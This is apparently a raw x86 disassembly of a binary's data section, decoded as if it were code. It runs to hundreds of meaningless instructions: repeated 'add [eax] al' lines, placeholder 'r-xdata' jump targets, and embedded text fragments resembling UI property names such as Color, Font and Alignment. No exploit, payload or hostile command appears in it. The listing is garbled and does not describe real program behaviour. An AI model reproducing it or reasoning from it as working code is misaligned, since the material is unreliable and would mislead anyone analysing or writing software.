arpl [ eax + 0x6f ] bp
jb r-xdata
add al dl
jno r-xdata
add dh bh
xchg esp eax
loopne r-xdata
add [ eax ] cl
inc edx
outsd
add [ esi + edi + 0x7d080049 ] al
dec ecx
add [ eax - 0x13ffb6cf ] dl
dec ecx
add [ eax + 0x7e ] bl
dec ecx
add ah ah
dec ecx
add [ eax + eax * 2 + 0x4a ] ch
add [ edx + eax * 2 ] bh
dec edx
add [ eax + 0x28004a42 ] dh
inc esi
dec edx
add [ ebx ] cl
push esp
push esp
popad
bound eax [ ebx + 0x6f ]
outsb
je r-xdata
add [ ebp + edi * 2 + 0x687c0049 ] dl
dec ecx
add [ eax - 0x1fffb6ca ] ah
into
dec eax
add al bl
or cl [ ecx ]
add bh bh
loopne r-xdata
jb r-xdata
add [ eax ] al
xor ah 0xff
imul ebp [ esi + 0x74 ] 0x44561873
add ah ah
add [ eax ] eax
call [ eax + 0x52 ]
dec ecx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
dec [ eax ]
push ebx
dec ecx
add [ edx + ebp * 2 + 0x49 ] dh
add [ eax ] al
add [ eax ] al
push eax
adc eax [ edx ]
pop edi
add [ eax ] al
push [ eax ]
add [ eax ] al
add [ ebx ] bl
add bh bh
pushad
ror [ eax ] cl
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
sldt [ 0x67696c41 ]
outsb
push 0x6100487b
add [ eax ] al
[ edi + ecx * 8 - 0x2f37ffb8 ]
adc eax [ eax ]
or [ edi + ebp * 2 + 0x63 ] al
imul edx [ ebx + 0x69 ] 0x74
sbb [ gs : esi + 0x44 ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
imul eax [ ecx + ebp * 2 + 0x4d ] 0x1c65646f
jl r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x42080011 ] al
add [ edx + eax ] dl
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430b0012 ] al
outsd
outsb
jae r-xdata
add [ eax ] dh
add bh bh
mov [ ecx + ecx * 2 ] cs
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4906001b ] al
insd
popad
jae r-xdata
add [ eax + 0x48 ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x46040019 ] al
add [ eax ] 0x0
add [ eax + 0x440e0014 ] al
outsd
jne r-xdata
jpe r-xdata
add [ eax ] al
add [ eax ] al
pop ss
insb
inc edx
jne r-xdata
add [ ecx ] cl
dec ebp
jne r-xdata
push esi
inc esp
add [ eax + 0x2 ] dh
add bh bh
je r-xdata
add [ eax ] cl
je r-xdata
push esi
inc esp
add [ edx + eax ] ah
call [ eax ]
inc ebx
dec edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sbb al [ eax ]
or [ eax + 0x6f ] cl
add [ eax ] al
add [ ebx - 0x74010000 ] cl
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
push ss
add [ eax ] cl
inc esp
jb r-xdata
dec eax
outsd
dec ebp
outsd
sbb [ gs : esi + 0x44 ] dl
add [ eax + eax ] cl
add [ eax ] cl
inc esp
jb r-xdata
popad
jb r-xdata
je r-xdata
jb r-xdata
dec edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sbb al 0x0
or [ ebp + 0x75 ] ecx
insb
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sbb eax 0x754d0b00
jb r-xdata
outsd
outsb
je r-xdata
sbb [ ecx ] 0x0
add al 0x46
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
sub al 0xd1
jb r-xdata
cwde
jno r-xdata
jmp esp
outsb
je r-xdata
push eax
dec esp
imul ebp [ esi + 0x65 ] r-xdata
jno r-xdata
test al 0x44
dec edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
push ds
add [ ecx ] cl
dec edi
ja r-xdata
add bh bh
add [ eax ] al
push ebx
insb
arpl [ gs : eax + ebx + 0x56 ] si
inc esp
add [ edx + 0x2 ] dh
insb
je r-xdata
or ecx [ ebp + 0x75 ]
arpl [ ebx - 0x5c ] bp
dec eax
add [ eax ] ah
add dh bh
add [ eax ] eax
add [ eax ] al
add [ ecx + edx * 8 ] ch
add [ edx ] bh
add bh bh
jpe r-xdata
add [ eax ] eax
add [ eax ] al
imul eax [ ecx + ebp * 2 + 0x4d ] 0x1865646f
push esi
inc esp
add dh ah
add [ eax ] eax
dec esp
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
xchg esp eax
inc esp
dec edx
add bh bh
add [ eax ] al
add [ eax + 0x1 ] al
jb r-xdata
inc [ edi + ebx * 8 + 0x48 ]
outsb
je r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0xc ] al
adc eax 0x72440a00
popad
inc ebx
jne r-xdata
add [ eax ] al
outsb
je r-xdata
and [ eax ] al
adc al 0x50
popad
jb r-xdata
jb r-xdata
outsb
je r-xdata
jo r-xdata
add [ eax + 0x1 ] al
outsd
jne r-xdata
jmp [ eax + 0x48 ]
jo r-xdata
or [ eax + 0x6f ] edx
outsd
outsb
je r-xdata
pushfd
loopne r-xdata
ja r-xdata
push 0x6948776f
fisttp [ ecx ]
jge r-xdata
outsd
jae r-xdata
outsb
jne r-xdata
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
and eax 0x63530e00
jb r-xdata
outsb
je r-xdata
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
dec eax
insb
inc edx
jne r-xdata
push eax
popad
jb r-xdata
add [ esi ] cl
push esi
inc esp
add [ edx - 0x1b010000 ] cl
loopne r-xdata
add [ eax ] al
and [ eax ] eax
or dl [ eax + 0x61 ]
jb r-xdata
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add [ esi ] cl
push esi
inc esp
add [ eax ] ah
add bh bh
insb
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
pop ds
clc
inc esp
dec edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
daa
add [ 0x6c797453 ] al
push esp
push esi
inc esp
add [ esi - 0x7700fffe ] al
inc ebp
dec edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add bh bh
clc
jpe r-xdata
je r-xdata
push edx
add [ ebx ] cl
push edx
popad
and al 0x0
or edx [ edx + 0x61 ]
push esi
inc esp
add [ ebx + 0x2 ] dh
add [ edx + ebp * 2 + 0x6b2c0049 ] ch
push 0x487af874
insb
insb
dec edi
jo r-xdata
add [ edx + eax ] bh
inc esp
push 0x6948776f
outsb
je r-xdata
add [ eax ] 0x0
jb r-xdata
add bh bh
mov esp 0x1004a44
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
and al [ eax ]
push cs
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
inc edx
add [ ecx * 2 + 0x46e4004a ] ah
dec edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x5404002b ] al
popad
bound esi [ ebx + 0x6c ]
push esi
inc esp
add al bl
inc edx
dec edx
add al ch
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp bh 0xff
sbb [ esi + 0x44 ] dl
add [ ecx - 0x3f010000 ] cl
loopne r-xdata
dec ecx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp bh 0xff
lodsb [ esi ]
push 0x49
add [ ebx + ebp * 2 ] ch
imul esp [ edi + 0x68 ] 0x44561874
push edx
pop ds
inc esi
add [ eax + eax ] bh
add [ eax + 0x50090023 ] al
outsd
sbb [ fs : esi + 0x44 ] dl
add [ ecx ] bl
add bh bh
sub [ eax ] al
or [ ecx + 0x62 ] edx
dec eax
imul esp [ gs : edi + 0x68 ] 0x487af874
add [ eax ] al
add [ eax ] al
add [ eax + 0x48e0 ] cl
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x53080026 ] al
sub_49e8c3
add [ ecx + eax * 4 + 0x44 ] ah
add [ eax + 0x5c004a4d ] ah
jne r-xdata
in al 0xce
dec eax
add [ eax ] ch
or cl [ ecx ]
push esp
or cl [ ecx ]
xor al 0x4c
dec ecx
add [ eax - 0x23 ] ah
dec eax
add [ eax ] bl
ror [ eax ] 0x1
call 0xffffffffd44a3213
jle r-xdata
add [ eax - 0x3fffb6d5 ] al
dec ebp
inc edx
add [ eax + 0x8 ] bl
dec ecx
add [ ebp + 0x4eb40049 ] dl
dec edx
add [ eax - 0x23 ] bh
dec eax
add [ edx + ebp * 8 ] dl
inc edx
add [ eax ] bl
out 0x42 eax
add [ eax ] dl
out 0x42 eax
add [ edx + ebp * 8 ] bl
inc edx
add [ eax ] bh
dec ebp
dec edx
add [ eax - 0x73ffb691 ] al
jne r-xdata
push esp
sub al 0x49
add [ eax + 0x40048e1 ] bl
loopne r-xdata
add ah ch
sub ecx [ ecx ]
xchg esp eax
jge r-xdata
nop
dec cx
add [ eax + 0x67 ] dl
dec ecx
add al bl
je r-xdata
push 0xdc746565
add [ eax + ebp * 2 + 0x49 ] bh
add [ esi + edi + 0x7d080049 ] al
dec ecx
add [ eax - 0x13ffb6cf ] dl
dec ecx
add [ eax ] dh
push eax
dec edx
add ah ah
dec ecx
add [ esi ] al
add [ edx ] dl
mov al 0x19
mov al 0x85
add [ eax ] bl
add esi [ eax - 0x7f005001 ]
push eax
dec edx
add [ eax - 0x23ffb5b0 ] bl
add [ ebp + edi * 2 + 0x687c0049 ] dl
dec ecx
add [ eax - 0x1fffb6ca ] ah
into
dec eax
add al bl
or cl [ ecx ]
add [ ecx + 0x67340049 ] dh
dec ecx
add [ eax - 0x1bffb6ee ] ch
sbb eax 0x2d000049
dec ecx
add [ eax - 0x3fffb5b2 ] bl
sub [ ecx ] ecx
aam 0x27
dec ecx
add [ eax - 0x43ffb6d3 ] bl
sub eax 0x2e500049
dec ecx
add [ esp + ebp + 0x49 ] dl
push eax
dec ecx
add [ edi + ecx * 8 + 0x69b00048 ] bl
dec ecx
add al dl
imul ecx [ ecx ] sub_49663c
push ecx
dec edx
add ah dh
push edx
dec edx
add ah ch
dec ebp
dec edx
add [ esi + ecx * 2 ] cl
dec edx
add [ ecx ] cl
push esp
push esp
popad
bound edx [ ebx + 0x68 ]
je r-xdata
inc [ eax - 0x67ffb5b0 ]
push eax
dec edx
add ah bl
jmp 0x950ea27
sub_49f507
add [ eax ] cl
push esp
popad
bound ecx [ edi + 0x72 ]
jb r-xdata
push esp
popad
bound ecx [ eax + 0x65 ]
imul esp [ edi + 0x68 ] 0x44566c74
add al bl
inc edx
dec edx
add al ch
add [ eax ] al
inc [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp bh 0xff
fisttp [ ecx ]
jle r-xdata
dec esp
inc esi
dec edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sub eax [ eax ]
or edx [ ecx + 0x62 ]
push eax
outsd
jae r-xdata
add bh bh
insb
je r-xdata
outsd
outsb
sbb [ esi + 0x44 ] dl
add al ah
add [ eax ] eax
inc [ ebx + ebp * 2 + 0x49 ]
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sub al 0x0
pop es
push esp
popad
bound edx [ ebx + 0x74 ]
outsd
jo r-xdata
add [ eax ] al
add [ eax - 0x80000000 ] al
das
add [ eax ] cl
dec edi
push esi
inc esp
add [ edx + eax + 0x46f4ff00 ] al
dec edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sub eax 0x61540800
bound edx [ edi + 0x69 ]
je r-xdata
outsb
sbb al 0x87
dec eax
add [ eax ] ah
add [ eax ] eax
jmp [ eax ]
outsb
inc ebx
push 0x65676e61
push 0xa80049db
add al [ eax ]
[ eax + 0x1ff0002 ]
sbb [ esi + 0x44 ] dl
add [ edi ] dl
add bh bh
mov al 0xde
dec eax
add [ eax ] bl
or [ ecx ] cl
add [ eax ] al
add [ eax + 0x1 ] al
add [ cs : edi ] al
push esi
imul esi [ ebx + 0x69 ] 0xf0656c62
adc al 0x42
add [ eax - 0x5f00fffe ] ah
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f08002f ] al
sub_4a03fc
push cs
adc [ ebx + eax * 2 + 0x6f ] edx
outsb
jbe r-xdata
imul esp [ esp + 0x65 ] 0x676c0c6e
jae r-xdata
jb r-xdata
je r-xdata
outsd
insb
insb
popad
jo r-xdata
or ebp [ fs : edi + 0x73 ]
dec esi
outsd
dec eax
popad
jb r-xdata
imul ebp [ edi + 0x6e ] 0x6d726f46
popad
je r-xdata
add [ eax ] al
add [ esi + ebx - 0x7d93ffbe ] cl
inc esp
adc al 0x6c
jae r-xdata
push ebx
or ch [ edi + 0x73 ]
inc esi
insb
jae r-xdata
push esi
inc esp
add [ eax + eax ] al
add [ eax ] al
nop
and al 0x4
dec edx
add [ ecx ] al
push es
push esp
push edi
imul esp [ esp + esi * 2 + 0x68 ] 0xfffffe04
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add ah al
inc esp
nop
nop
mov esp 0x7004a05
or dl [ esp + ecx * 2 + 0x69 ]
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + 0x38004a05 ] ch
jne r-xdata
add [ edx + eax * 4 + 0x44 ] dh
add [ esp + eax * 4 + 0x44 ] cl
add [ esp + eax * 4 + 0x44 ] al
add [ eax + 0x5509090 ] dl
dec edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x5 ] dh
dec edx
add [ ebp + eax + 0x4a ] bh
add [ eax ] al
cmp [ edx + ecx * 2 ] al
add [ eax ] al
stosb [ edi ]
add eax 0x38004a
add [ eax ] al
mov [ esi ] ds
jae r-xdata
inc ebx
outsd
outsd
insb
insb
popad
jo r-xdata
add al [ eax ]
pop es
inc edi
jb r-xdata
inc edx
add [ edx + eax * 4 + 0x44 ] ch
push ebx
je r-xdata
add [ eax ] bh
add [ ecx + eax * 4 + 0x44 ] ah
add [ edi * 8 + 0x4e90004a ] ah
insb
jae r-xdata
add eax 0x5bc004a
dec edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
imul esp [ edx + 0x6c ] 0x676c0a65
jae r-xdata
outsb
les edx [ esi + 0x44 ]
jne r-xdata
jb r-xdata
add [ eax + 0x47070002 ] al
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
imul ebp [ esi + 0x6b ] 0x75636f46
jae r-xdata
dec eax
fadd [ edx + ecx * 2 ]
add [ esi ] al
adc dl [ esp + ecx * 2 + 0x69 ]
jae r-xdata
outsd
arpl [ ebp + 0x73 ] si
or ebp [ fs : edi + 0x73 ]
push ebx
insb
arpl [ gs : ebp + 0x64 ] si
or ebp [ edi + 0x73 ]
push ebx
jne r-xdata
insb
sti
dec edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
je r-xdata
add [ eax + eax ] bl
inc esp
dec ecx
inc esp
fadd [ edx + ecx * 2 ]
add al ah
clc
dec edx
add [ eax + 0x1004af9 ] cl
inc edi
add [ edi ] al
push eax
add eax 0x1f24004a
inc edx
add [ eax + eax ] cl
or [ ebx + 0x6f ] al
insd
inc ebx
je r-xdata
add [ esp + eax * 4 + 0x44 ] ah
add [ eax - 0x7c ] ch
inc esp
add [ esp + eax * 4 + 0x44 ] ch
add [ eax - 0x7c ] ah
inc esp
add [ eax - 0x7f ] cl
inc esp
insd
inc ebx
je r-xdata
or [ fs : ebx + 0x6f ] al
std
add al ah
inc edi
jb r-xdata
add [ eax ] al
add [ eax ] 0x0
je r-xdata
add [ eax ] 0x0
add [ eax + 0x53080006 ] al
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x53050003 ] al
je r-xdata
dec edx
add [ ecx ] al
insb
jae r-xdata
dec esi
inc edx
jne r-xdata
add [ eax + 0x540a0009 ] al
imul esi [ esp + ebp * 2 + 0x65 ] 0x67616d49
push 0x2c0044ef
les edx [ gs : esi + 0x44 ]
add [ eax ] ah
add [ eax ] al
inc [ edx + edi * 8 + 0x1004a ]
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
pop es
add [ esi ] cl
jne r-xdata
add [ eax ] cl
push ebx
fcom [ edx ]
inc edx
add [ edx ] bl
add [ eax ] al
inc eax
stc
dec edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x480b0004 ] al
popad
jb r-xdata
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x48060000 ] al
popad
jb r-xdata
add ah al
push esi
inc esp
add [ eax + eax ] cl
add bh bh
cmp al 0xf6
dec edx
loopne r-xdata
push ebx
je r-xdata
add [ eax ] al
call [ ebx + edi * 8 + 0x1004a ]
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
or al [ eax ]
or eax 0x65747845
outsb
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
or [ eax ] eax
or dl [ ecx + ebp * 2 + 0x74 ]
insb
dec ecx
insd
popad
push 0x2c0044ef
jae r-xdata
add [ esi ] 0x0
or [ ebx + 0x75 ] dl
bound esi [ ecx + ebp * 2 + 0x74 ]
insb
insb
imul esp [ edi + 0x6e ] r-xdata
sbb eax [ eax ]
add bh bh
call 0x14a518d
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x460b0005 ] al
outsd
outsd
je r-xdata
push esi
inc esp
add [ eax ] dl
add [ eax ] al
push [ eax + 0x1004af6 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x46060001 ] al
outsd
outsd
je r-xdata
dec edx
add [ eax ] dh
cld
dec edx
add [ edx + edx * 2 + 0x42 ] bl
add [ esp + edi * 8 + 0x4a ] dl
add [ edx + edx * 2 - 0x3a3ffbe ] al
dec edx
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ esi ] al
add [ eax ] al
add ah al
push esi
inc esp
add [ eax + eax ] cl
add [ eax ] al
les edx [ esi + 0x44 ]
add [ eax ] dl
add [ eax ] al
add ah al
push esi
inc esp
add [ eax + eax ] bl
add [ eax ] al
les edx [ esi + 0x44 ]
add [ eax ] ah
add [ eax ] al
add ah al
push esi
inc esp
add [ eax + eax ] ah
add [ eax ] al
les edx [ esi + 0x44 ]
add [ eax ] dh
add [ eax ] al
add [ edx ] cl
push esp
dec esp
imul esi [ ebx + 0x74 ] 0x756f7247
jo r-xdata
and al 0xfd
dec edx
add [ eax - 0x67ffbdb2 ] dl
je r-xdata
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jb r-xdata
add [ eax ] 0x0
add [ eax + 0x42110008 ] al
outsd
je r-xdata
jb r-xdata
jb r-xdata
inc edx
add [ eax - 0x1fffbdb2 ] bl
je r-xdata
push ebx
insb
test [ eax + eax + 0x60 ] al
test [ eax + eax + 0x48 ] al
add [ eax + eax + 0x64 ] 0x8004481
dec ecx
insd
popad
les edx [ gs : bp + 0x44 ]
add [ eax ] dh
add [ eax ] al
outsb
add [ eax ] 0x0
add [ eax + 0x450d000a ] al
js r-xdata
jo r-xdata
or edx [ ebx + 0x75 ]
bound esi [ ebx + 0x65 ]
outsd
insd
inc esp
jae r-xdata
push esp
outsd
jo r-xdata
push cs
add bh bh
adc dl bh
dec edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
insb
imul esp [ edi + 0x6e ] r-xdata
sbb al 0x0
add [ eax ] al
push esi
inc esp
add [ eax + eax ] dl
add bh bh
push esp
test [ edx ] 0x1
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ eax - 0x7f ] cl
inc esp
add [ ecx + eax * 4 + 0x44 ] ah
add [ eax - 0x6fffb593 ] ch
xor [ eax ] cl
imul ebp [ edi + 0x6e ] r-xdata
and al 0x0
add bh bh
clc
cli
dec edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] bl
pop eax
inc edx
add [ eax + ebx * 2 ] bl
inc edx
add [ eax ] ah
pop eax
inc edx
add ah dl
push edi
inc edx
add [ eax ] dl
dec [ edx ]
sbb al 0x54
inc edx
add [ eax + 0x1004254 ] bl
add bh bh
dec [ edi + edi * 8 ]
dec edx
add [ ebx ] cl
push esp
dec esp
imul esi [ ebx + 0x74 ] 0x756f7247
jo r-xdata
add [ fs : eax + eax + 0x8 ] 0x90004253
dec esi
push ebx
inc edx
add [ eax - 0x67ffbdb2 ] dl
dec esi
inc edx
imul esi [ esp + ebp * 2 + 0x65 ] r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
xor [ eax ] cl
dec edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] bl
or [ edx ] cl
and [ eax ] cl
dec edx
add [ eax ] ah
add [ eax ] al
add [ eax + 0x1f ] dl
inc edx
add [ edx + eax * 4 + 0x44 ] ch
add [ edx + eax * 4 + 0x44 ] dh
add [ esp + eax * 4 + 0x44 ] cl
add [ esp + eax * 4 + 0x44 ] al
add [ esp + eax * 4 + 0x44 ] ah
add [ eax - 0x7c ] ch
inc esp
add [ esp + eax * 4 + 0x44 ] ch
add [ eax - 0x7c ] ah
inc esp
add [ eax - 0x7f ] cl
inc esp
add [ ecx + eax * 4 + 0x44 ] ah
add [ eax ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x530b000b ] al
jne r-xdata
jb r-xdata
or [ eax ] al
or [ ebx + 0x6f ] al
add [ edx + edx * 2 + 0x42 ] bl
add [ eax + esi * 2 + 0x4a ] al
dec edx
add [ eax + 0x72 ] dh
dec edx
add ah ah
jb r-xdata
add [ eax + 0x1c00424e ] dl
outsb
inc edi
jb r-xdata
inc edx
add [ eax + 0x7400424e ] bl
push ebx
inc edx
jae r-xdata
or [ ebx ] 0x0
jo r-xdata
add [ eax ] al
inc [ eax + 0x72 ]
dec edx
insb
add [ eax - 0x80000000 ] al
add al [ eax ]
pop es
inc ebx
inc ebx
outsd
insb
jne r-xdata
insd
dec edx
jne r-xdata
add [ ebx + edx * 2 + 0x42 ] dh
je r-xdata
insb
imul ebp [ edi + 0x6e ] r-xdata
sub [ eax ] al
add bh bh
call esp
jno r-xdata
add ah bl
adc al [ edx ]
or al 0x0
add bh bh
aam 0x71
dec edx
add bh bh
sub al 0x0
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
imul ebp [ edi + 0x6e ] r-xdata
sbb al 0x0
add bh bh
inc eax
jb r-xdata
add [ eax ] al
insd
inc ebx
je r-xdata
outsb
lodsb [ esi ]
or [ edx ] cl
and al 0x1f
inc edx
add [ eax ] cl
add [ eax ] cl
inc ebx
outsd
dec esi
inc edx
add [ esi + ebp * 2 ] bl
nop
jae r-xdata
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add [ eax ] al
or [ ecx + 0x6c ] eax
imul esp [ edi + 0x6e ] 0x746e656d
sbb [ esi + 0x44 ] dl
add [ 0xcff0000 ] cl
jb r-xdata
add [ eax ] al
add [ eax - 0x1 ] al
add eax [ eax ]
or cl [ ecx + 0x6d ]
popad
dec ecx
outsb
js r-xdata
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add [ eax ] eax
or [ ecx + 0x75 ] al
je r-xdata
add [ eax + eax + 0x4c ] 0x84
inc esp
add [ eax - 0x5fffb58f ] ch
jno r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add eax 0x694d0800
outsb
push edi
imul esp [ esp + esi * 2 + 0x68 ] r-xdata
sub al 0x0
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp bh 0xff
dec edx
add [ edi ] al
or edx [ esp + ecx * 2 + 0x69 ]
jae r-xdata
pop es
dec edx
add [ eax ] cl
and [ edx ] al
add [ eax ] al
or [ ebx + 0x6f ] al
insd
inc ebx
je r-xdata
je r-xdata
add al 0x4a
add [ eax + eax ] dl
add bh bh
push eax
jb r-xdata
add al 0x4a
popad
jo r-xdata
push ebx
imul edi [ edx + 0x65 ] r-xdata
adc [ eax ] al
add bh bh
add [ ecx + 0x4a ] dh
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43070002 ] al
push ebx
inc edx
add [ eax - 0x67ffbdb2 ] dl
dec esi
inc edx
add [ ebx + edx * 2 + 0x42 ] dh
add [ eax ] bl
pop eax
inc edx
add [ eax + ebx * 2 ] bl
inc edx
add [ eax ] ah
pop eax
inc edx
add ah dl
push edi
inc edx
add [ eax + 0x73 ] ch
dec edx
add [ esp + edx * 2 ] bl
inc edx
add [ eax + 0x1004254 ] bl
add bh bh
jmp [ ebx + esi * 2 + 0x4a ]
test [ eax + eax + 0x64 ] al
test [ eax + eax + 0x68 ] al
test [ eax + eax + 0x6c ] al
test [ eax + eax + 0x60 ] al
test [ eax + eax + 0x48 ] al
add [ eax + eax + 0x64 ] 0x8004481
add [ esp + eax * 4 + 0x44 ] al
add [ esp + eax * 4 + 0x44 ] ah
add [ eax - 0x7c ] ch
inc esp
add [ esp + eax * 4 + 0x44 ] ch
add [ eax - 0x7c ] ah
inc esp
add [ eax - 0x7f ] cl
inc esp
add [ ecx + eax * 4 + 0x44 ] ah
add [ eax ] cl
add [ eax ] al
add [ eax ] al
xor [ edx ] 0x0
inc esp
jo r-xdata
insb
jae r-xdata
inc edx
add [ edx + eax * 4 + 0x44 ] ch
add [ edx + eax * 4 + 0x44 ] dh
add [ esp + eax * 4 + 0x44 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al al
or cl [ edx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
movsb [ edi ] [ esi ]
or cl [ edx ]
lodsb [ esi ]
or cl [ edx ]
and [ eax ] al
add [ eax ] al
push eax
pop ds
add [ eax ] bl
add [ eax ] al
jmp [ eax + 0x72 ]
and [ edx + ecx * 2 ] al
push es
add [ ebx ] al
push esp
popad
and [ si ] al
dec edx
add [ eax ] ch
jno r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add al 0x0
or [ ebp + 0x61 ] cl
js r-xdata
jb r-xdata
add [ edx + edx * 2 + 0x6cf80042 ] al
dec edx
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add ah al
push esi
inc esp
add [ eax ] dl
add [ eax ] al
add [ ebx ] cl
push esp
dec esp
imul esi [ ebx + 0x74 ] 0x756c6f43
insd
outsb
nop
nop
[ edx ] cl
pop es
or edx [ esp + ecx * 2 + 0x69 ]
jae r-xdata
add [ eax + 0x4a08ac90 ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah cl
or [ edx ] cl
[ edx ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
fimul [ eax ]
dec edx
add [ eax + eax ] dh
add [ eax ] al
mov [ esi ] ds
inc edx
add [ edx + eax * 4 + 0x44 ] ch
add [ edx + eax * 4 + 0x44 ] dh
add [ esp + eax * 4 + 0x44 ] cl
add [ esp + eax * 4 + 0x44 ] al
add [ esp + eax * 4 + 0x44 ] ah
add [ eax - 0x7c ] ch
inc esp
add [ esp + eax * 4 + 0x44 ] ch
add [ eax - 0x7c ] ah
inc esp
pop es
add [ 0x74646957 ] al
push r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
ror [ edx ] 0x4a
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + ecx + 0xaac004a ] ah
dec edx
add [ eax ] ah
add [ eax ] al
add [ eax + 0x1f ] dl
add [ eax + 0x32 ] al
imul esp [ esp + esi * 2 + 0x68 ] r-xdata
sbb [ eax ] al
add bh bh
pushad
jb r-xdata
push 0x1c0044ef
jae r-xdata
add [ eax ] al
xor al [ eax ]
add [ ecx ] al
sub_4a1efe
inc esp
add [ eax - 0x1d ] cl
inc edx
add [ esp + eax * 4 + 0x44 ] ch
add al bl
cmp ecx [ ecx ]
dec eax
add [ eax + eax + 0x64 ] 0x90004481
xchg ebx eax
dec edx
